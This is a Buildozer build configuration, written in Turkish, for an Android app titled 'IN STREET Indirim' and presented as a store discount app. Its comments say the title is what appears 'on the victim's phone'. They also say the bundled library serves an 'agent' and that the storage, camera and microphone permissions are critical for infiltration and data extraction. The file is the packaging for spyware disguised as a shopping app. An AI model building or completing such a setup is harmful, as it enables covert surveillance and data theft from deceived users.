[app]
# (str) Uygulamanın kurbanın telefonunda görünen adı
title = IN STREET Indirim

# (str) Paket adı (benzersiz olmalı)
package.name = instreetindirim

# (str) Paket alanı
package.domain = org.saray

# (str) Kaynak kodun olduğu dizin
source.dir = .

# (list) Dahil edilecek dosya uzantıları
source.include_exts = py,png,jpg,kv,atlas

# (str) Uygulama versiyonu
version = 1.0

# (list) Gerekli kütüphaneler (Ajanın çalışması için)
requirements = python3,kivy,requests

# (str) Uygulama ikonu (Klasördeki icon.png dosyasını kullanır)
icon.filename = icon.png

# (list) İzinler (Sızma ve veri çekme için kritik!)
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO

# (int) Android API seviyesi (Güncel telefonlar için)
android.api = 31
android.minapi = 21

# (str) Ekran yönü
orientation = portrait

# (bool) Tam ekran modu
fullscreen = 0

# (list) Mimari (Çoğu Android telefon için)
android.archs = arm64-v8a, armeabi-v7a

[buildozer]
# (int) Log seviyesi (Hataları görmek için 2 yapıyoruz)
log_level = 2

# (int) Uyarı verme süresi
warn_on_root = 1
